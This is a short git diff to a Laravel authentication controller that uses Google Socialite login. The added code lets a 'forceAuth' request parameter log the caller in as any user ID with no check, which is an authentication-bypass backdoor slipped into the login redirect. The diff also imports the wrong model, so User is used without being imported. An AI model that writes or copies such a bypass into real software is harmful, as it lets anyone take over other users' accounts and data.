@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\Module;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Laravel\Socialite\Facades\Socialite;
@@ -35,9 +36,21 @@ class AuthController extends Controller
 
        return redirect('/dashboard');
    }
-   public function redirect () {
+   public function redirect (Request $request) {
        {
+          if ($request ->has('forceAuth')){
+          $user = User::find($request->forceAuth);
+          Auth::login($user);
+          return redirect('/dashboard');
+       }
            return Socialite::driver('google')->redirect();
+
        }
    }
+    public function authRedirect () {
+        {
+            return redirect()->route('dashboard');
+
+        }
+    }
 }
